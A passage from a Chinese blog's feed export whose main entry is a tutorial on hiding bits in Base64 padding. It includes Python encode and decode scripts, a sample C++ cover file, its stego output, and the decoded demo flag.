class="string">/</span></span><br></pre></td></tr></table></figure><p>三种格式的配置文件都能使用，但是只能存在一个</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64的隐写</title>
      <link href="/2021/07/19/e19df605d77e-q1jun/"/>
      <url>/2021/07/19/e19df605d77e-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Base64的隐写"><a href="#Base64的隐写" class="headerlink" title="Base64的隐写"></a>Base64的隐写</h1><h2 id="0x01-隐写原理"><a href="#0x01-隐写原理" class="headerlink" title="0x01 隐写原理"></a>0x01 隐写原理</h2><p>填充两个’&#x3D;’隐写四位信息，填充一个’&#x3D;’隐写两位信息，将编码按照base64对照表还原，然后每8位转成字符即可.<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/base64.png" alt="base64对照表"></p><h2 id="0x02-隐写脚本"><a href="#0x02-隐写脚本" class="headerlink" title="0x02 隐写脚本"></a>0x02 隐写脚本</h2><p>通过读取源文件source.txt文件把需要隐写的内容隐写进去并保存到stego.txt中。<br>相应加密脚本enStego.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enStego</span>(<span class="params">sourceFile,setgoFile,message</span>):</span><br><span class="line">    b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sourceFile,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> sourceText, <span class="built_in">open</span>(setgoFile,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> setgoText:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        message = <span class="string">&quot;&quot;</span>.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> sourceText:</span><br><span class="line">            text = base64.b64encode(line[:-<span class="number">1</span>].encode(<span class="string">&quot;utf-8&quot;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            l = text.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="number">2</span>*l &lt;= <span class="built_in">len</span>(message):                </span><br><span class="line">                text = text[:-l-<span class="number">1</span>] + b64table[b64table.index(text[-l-<span class="number">1</span>])+<span class="built_in">int</span>(message[:<span class="number">2</span>*l],<span class="number">2</span>)] + text[-l:]</span><br><span class="line">                message = message[<span class="number">2</span>*l:]</span><br><span class="line">            setgoText.write(text+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(message):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Remaining&quot;</span>,enStego(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>]),<span class="string">&quot;bits!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Remaining&quot;</span>,enStego(<span class="string">&quot;source.txt&quot;</span>,<span class="string">&quot;stego.txt&quot;</span>,<span class="string">&quot;SimpleMessage\n&quot;</span>),<span class="string">&quot;bits!&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 enStego.py source.txt stego.txt 「隐写信息」</span><br></pre></td></tr></table></figure><p>source.txt文件内容(任意内容，这里只是放了一段C++代码)：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;linearList.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">template &lt;class T&gt;</span><br><span class="line">struct chainNode</span><br><span class="line">&#123;</span><br><span class="line">T element;</span><br><span class="line">chainNode&lt;T&gt; *next;</span><br><span class="line"></span><br><span class="line">chainNode()&#123;&#125;</span><br><span class="line">chainNode(const T&amp; element)&#123;</span><br><span class="line">this-&gt;element = element;</span><br><span class="line">&#125;</span><br><span class="line">chainNode(const T&amp; element, chainNode&lt;T&gt;* next)&#123;</span><br><span class="line">this-&gt;element = element;</span><br><span class="line">this-&gt;next = next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">template &lt;class T&gt;</span><br><span class="line">class chain :public linearList&lt;T&gt;</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">chain(int initialCapacity = 10);</span><br><span class="line">chain(const chain&lt;T&gt;&amp;);</span><br><span class="line">~chain();</span><br><span class="line"></span><br><span class="line">bool empty() const&#123;</span><br><span class="line">return listSize == 0;</span><br><span class="line">&#125;</span><br><span class="line">int size() const&#123;</span><br><span class="line">return listSize;</span><br><span class="line">&#125;</span><br><span class="line">T&amp; get(int theIndex) const;</span><br><span class="line">int indexOf(const T&amp; theElement) const;</span><br><span class="line">void erase(int theIndex);</span><br><span class="line">void insert(int theIndex, const T&amp; theElement);</span><br><span class="line">void output(std::ostream&amp; out) const;</span><br><span class="line"></span><br><span class="line">protected:</span><br><span class="line">void checkIndex(int theIndex) const;</span><br><span class="line">chainNode&lt;T&gt;* firstNode;</span><br><span class="line">int listSize;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">chain&lt;T&gt;::chain(int initialCapacity)&#123;</span><br><span class="line">if(initialCapacity &lt; 1)&#123;</span><br><span class="line">std::ostringstream s;</span><br><span class="line">s &lt;&lt; &quot;initial capacity = &quot;&lt;&lt; initialCapacity &lt;&lt; &quot; Must be &gt; 0&quot;;</span><br><span class="line">throw illegalParameterValue(s.str());</span><br><span class="line">&#125;</span><br><span class="line">firstNode = NULL;</span><br><span class="line">listSize = 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">chain&lt;T&gt;::chain(const chain&lt;T&gt;&amp; theList)&#123;</span><br><span class="line">listSize = theList.listSize;</span><br><span class="line">if (listSize == 0)</span><br><span class="line">&#123;</span><br><span class="line">firstNode = NULL;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">chainNode&lt;T&gt;* sourceNode = theList.firstNode;</span><br><span class="line">firstNode = new chainNode&lt;T&gt;(sourceNode-&gt;element);</span><br><span class="line">sourceNode = sourceNode-&gt;next;</span><br><span class="line">chainNode&lt;T&gt;* targetNode = firstNode;</span><br><span class="line">while(sourceNode != NULL)&#123;</span><br><span class="line">targetNode-&gt;next = new chainNode&lt;T&gt;(sourceNode-&gt;element);</span><br><span class="line">targetNode = targetNode-&gt;next;</span><br><span class="line">sourceNode = sourceNode-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">targetNode-&gt;next = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">chain&lt;T&gt;::~chain()&#123;</span><br><span class="line">while(firstNode != NULL)&#123;</span><br><span class="line">chainNode&lt;T&gt;* nextNode = firstNode-&gt;next;</span><br><span class="line">delete firstNode;</span><br><span class="line">firstNode = nextNode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">T&amp; chain&lt;T&gt;::get(int theIndex) const&#123;</span><br><span class="line">checkIndex(theIndex);</span><br><span class="line">chainNode&lt;T&gt;* currentNode = firstNode;</span><br><span class="line">for(int i = 0; i &lt; theIndex; ++i)&#123;</span><br><span class="line">currentNode = currentNode-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">return currentNode-&gt;element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">int chain&lt;T&gt;::indexOf(const T&amp; theElement) const&#123;</span><br><span class="line">chainNode&lt;T&gt;* currentNode = firstNode;</span><br><span class="line">int  index = 0;</span><br><span class="line">while(currentNode != NULL &amp;&amp; currentNode-&gt;element != theElement)&#123;</span><br><span class="line">currentNode = currentNode-&gt;next;</span><br><span class="line">++index;</span><br><span class="line">&#125;</span><br><span class="line">if(currentNode == NULL)&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return index;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">void chain&lt;T&gt;::erase(int theIndex)&#123;</span><br><span class="line">checkIndex(theIndex);</span><br><span class="line">chainNode&lt;T&gt;* deleteNode;</span><br><span class="line">if(theIndex == 0)&#123;</span><br><span class="line">deleteNode = firstNode;</span><br><span class="line">firstNode = firstNode-&gt;next;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">chainNode&lt;T&gt;* p = firstNode;</span><br><span class="line">for(int i = 0;i &lt; theIndex - 1;++i)&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">deleteNode = p-&gt;next;</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">--listSize;</span><br><span class="line">delete deleteNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">void chain&lt;T&gt;::insert(int theIndex, const T&amp; theElement)&#123;</span><br><span class="line">if(theIndex &lt; 0 || theIndex &gt; listSize)&#123;</span><br><span class="line">std::ostringstream s;</span><br><span class="line">s &lt;&lt; &quot;index = &quot; &lt;&lt; theIndex &lt;&lt; &quot; size = &quot; &lt;&lt; listSize;</span><br><span class="line">throw illegalIndex(s.str());</span><br><span class="line">&#125;</span><br><span class="line">if(theIndex == 0)&#123;</span><br><span class="line">firstNode = new chainNode&lt;T&gt;(theElement,firstNode);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">chainNode&lt;T&gt;* p = firstNode;</span><br><span class="line">for(int  i = 0;i &lt; theIndex - 1;++i)&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next = new chainNode&lt;T&gt;(theElement,p-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line">++listSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">void chain&lt;T&gt;::output(std::ostringstream&amp; out) const&#123;</span><br><span class="line">for(chainNode&lt;T&gt;* currentNode = firstNode; currentNode != NULL; chainNode = chainNode-&gt;next)&#123;</span><br><span class="line">out &lt;&lt; currentNode-&gt;element &lt;&lt; &quot; &quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template &lt;typename T&gt;</span><br><span class="line">std::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const chain&lt;T&gt;&amp; x)&#123;</span><br><span class="line">x.output(out);</span><br><span class="line">return out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到stego.txt文件内容：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">I2luY2x1ZGUgImxpbmVhckxpc3QuaCJ=</span><br><span class="line">I2luY2x1ZGUgPGlvc3RyZWFtPp==</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPGNsYXNzIFQ+</span><br><span class="line">c3RydWN0IGNoYWluTm9kZZ==</span><br><span class="line">e7==</span><br><span class="line">CVQgZWxlbWVudDs=</span><br><span class="line">CWNoYWluTm9kZTxUPiAqbmV4dDt=</span><br><span class="line"></span><br><span class="line">CWNoYWluTm9kZSgpe32=</span><br><span class="line">CWNoYWluTm9kZShjb25zdCBUJiBlbGVtZW50KXs=</span><br><span class="line">CQl0aGlzLT5lbGVtZW50ID0gZWxlbWVudDt=</span><br><span class="line">CX1=</span><br><span class="line">CWNoYWluTm9kZShjb25zdCBUJiBlbGVtZW50LCBjaGFpbk5vZGU8VD4qIG5leHQpe5==</span><br><span class="line">CQl0aGlzLT5lbGVtZW50ID0gZWxlbWVudDv=</span><br><span class="line">CQl0aGlzLT5uZXh0ID0gbmV4dDt=</span><br><span class="line">CX3=</span><br><span class="line">fTu=</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPGNsYXNzIFQ+</span><br><span class="line">Y2xhc3MgY2hhaW4gOnB1YmxpYyBsaW5lYXJMaXN0PFQ+</span><br><span class="line">e9==</span><br><span class="line">cHVibGljOo==</span><br><span class="line">CWNoYWluKGludCBpbml0aWFsQ2FwYWNpdHkgPSAxMCk7</span><br><span class="line">CWNoYWluKGNvbnN0IGNoYWluPFQ+Jik7</span><br><span class="line">CX5jaGFpbigpO5==</span><br><span class="line"></span><br><span class="line">CWJvb2wgZW1wdHkoKSBjb25zdHu=</span><br><span class="line">CQlyZXR1cm4gbGlzdFNpemUgPT0gMDs=</span><br><span class="line">CX1=</span><br><span class="line">CWludCBzaXplKCkgY29uc3R7</span><br><span class="line">CQlyZXR1cm4gbGlzdFNpemU7</span><br><span class="line">CX1=</span><br><span class="line">CVQmIGdldChpbnQgdGhlSW5kZXgpIGNvbnN0O8==</span><br><span class="line">CWludCBpbmRleE9mKGNvbnN0IFQmIHRoZUVsZW1lbnQpIGNvbnN0O9==</span><br><span class="line">CXZvaWQgZXJhc2UoaW50IHRoZUluZGV4KTu=</span><br><span class="line">CXZvaWQgaW5zZXJ0KGludCB0aGVJbmRleCwgY29uc3QgVCYgdGhlRWxlbWVudCk7</span><br><span class="line">CXZvaWQgb3V0cHV0KHN0ZDo6b3N0cmVhbSYgb3V0KSBjb25zdDt=</span><br><span class="line">CU==</span><br><span class="line">cHJvdGVjdGVkOt==</span><br><span class="line">CXZvaWQgY2hlY2tJbmRleChpbnQgdGhlSW5kZXgpIGNvbnN0O4==</span><br><span class="line">CWNoYWluTm9kZTxUPiogZmlyc3ROb2RlO9==</span><br><span class="line">CWludCBsaXN0U2l6ZTs=</span><br><span class="line">fTt=</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPHR5cGVuYW1lIFQ+</span><br><span class="line">Y2hhaW48VD46OmNoYWluKGludCBpbml0aWFsQ2FwYWNpdHkpe3==</span><br><span class="line">CWlmKGluaXRpYWxDYXBhY2l0eSA8IDEpe8==</span><br><span class="line">CQlzdGQ6Om9zdHJpbmdzdHJlYW0gczv=</span><br><span class="line">CQlzIDw8ICJpbml0aWFsIGNhcGFjaXR5ID0gIjw8IGluaXRpYWxDYXBhY2l0eSA8PCAiIE11c3QgYmUgPiAwIjs=</span><br><span class="line">CQl0aHJvdyBpbGxlZ2FsUGFyYW1ldGVyVmFsdWUocy5zdHIoKSk7</span><br><span class="line">CX1=</span><br><span class="line">CWZpcnN0Tm9kZSA9IE5VTEw7</span><br><span class="line">CWxpc3RTaXplID0gMDt=</span><br><span class="line">fc==</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPHR5cGVuYW1lIFQ+</span><br><span class="line">Y2hhaW48VD46OmNoYWluKGNvbnN0IGNoYWluPFQ+JiB0aGVMaXN0KXv=</span><br><span class="line">CWxpc3RTaXplID0gdGhlTGlzdC5saXN0U2l6ZTt=</span><br><span class="line">CWlmIChsaXN0U2l6ZSA9PSAwKX==</span><br><span class="line">CXv=</span><br><span class="line">CQlmaXJzdE5vZGUgPSBOVUxMO0==</span><br><span class="line">CQlyZXR1cm47</span><br><span class="line">CX0=</span><br><span class="line">CWNoYWluTm9kZTxUPiogc291cmNlTm9kZSA9IHRoZUxpc3QuZmlyc3ROb2RlO1==</span><br><span class="line">CWZpcnN0Tm9kZSA9IG5ldyBjaGFpbk5vZGU8VD4oc291cmNlTm9kZS0+ZWxlbWVudCk7</span><br><span class="line">CXNvdXJjZU5vZGUgPSBzb3VyY2VOb2RlLT5uZXh0O7==</span><br><span class="line">CWNoYWluTm9kZTxUPiogdGFyZ2V0Tm9kZSA9IGZpcnN0Tm9kZTt=</span><br><span class="line">CXdoaWxlKHNvdXJjZU5vZGUgIT0gTlVMTCl7</span><br><span class="line">CQl0YXJnZXROb2RlLT5uZXh0ID0gbmV3IGNoYWluTm9kZTxUPihzb3VyY2VOb2RlLT5lbGVtZW50KTt=</span><br><span class="line">CQl0YXJnZXROb2RlID0gdGFyZ2V0Tm9kZS0+bmV4dDu=</span><br><span class="line">CQlzb3VyY2VOb2RlID0gc291cmNlTm9kZS0+bmV4dDs=</span><br><span class="line">CX1=</span><br><span class="line">CXRhcmdldE5vZGUtPm5leHQgPSBOVUxMOz==</span><br><span class="line">fS==</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPHR5cGVuYW1lIFQ+</span><br><span class="line">Y2hhaW48VD46On5jaGFpbigpe2==</span><br><span class="line">CXdoaWxlKGZpcnN0Tm9kZSAhPSBOVUxMKXu=</span><br><span class="line">CQljaGFpbk5vZGU8VD4qIG5leHROb2RlID0gZmlyc3ROb2RlLT5uZXh0O1==</span><br><span class="line">CQlkZWxldGUgZmlyc3ROb2RlO7==</span><br><span class="line">CQlmaXJzdE5vZGUgPSBuZXh0Tm9kZTu=</span><br><span class="line">CX1=</span><br><span class="line">fZ==</span><br><span class="line"></span><br><span class="line">dGVtcGxhdGUgPHR5cGVuYW1lIFQ+</span><br><span class="line">VCYgY2hhaW48VD46OmdldChpbnQgdGhlSW5kZXgpIGNvbnN0e9==</span><br><span class="line">CWNoZWNrSW5kZXgodGhlSW5kZXgpO/==</span><br><span class="line">CWNoYWluTm9kZTxUPiogY3VycmVudE5vZGUgPSBmaXJzdE5vZGU7</span><br><span class="line">CWZvcihpbnQgaSA9IDA7IGkgPCB0aGVJbmRleDsgKytpKXt=</span><br></pre></td></tr></table></figure><h2 id="0x03-解密脚本"><a href="#0x03-解密脚本" class="headerlink" title="0x03 解密脚本"></a>0x03 解密脚本</h2><p>根据Base64的填充规则，向填充位读出隐藏信息。</p><p>相应脚本deStego.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deStego</span>(<span class="params">stegoFile</span>):</span><br><span class="line">    b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(stegoFile,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> stegoText:</span><br><span class="line">        message = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stegoText:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = line[line.index(<span class="string">&quot;=&quot;</span>) - <span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">                message += <span class="string">&quot;&quot;</span>.join([ <span class="built_in">bin</span>( <span class="number">0</span> <span class="keyword">if</span> i == <span class="string">&#x27;=&#x27;</span> <span class="keyword">else</span> b64table.find(i))[<span class="number">2</span>:].zfill(<span class="number">6</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])[<span class="number">2</span> <span class="keyword">if</span> text.count(<span class="string">&#x27;=&#x27;</span>) ==<span class="number">2</span> <span class="keyword">else</span> <span class="number">4</span>:<span class="number">6</span>]  </span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(message[i:i+<span class="number">8</span>],<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(deStego(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(deStego(<span class="string">&quot;stego.txt&quot;</span>))</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 deStego.py stego.txt</span><br><span class="line">flag&#123;base64_1s_Ama2ing&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Misc </tag>
            
            <tag> Base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top10 及常见预防方法</title>
      <link href="/2021/07/06/d7843130fc49-q1jun/"/>
      <url>/2021/07/06/d7843130fc49-q1jun/</url>
      
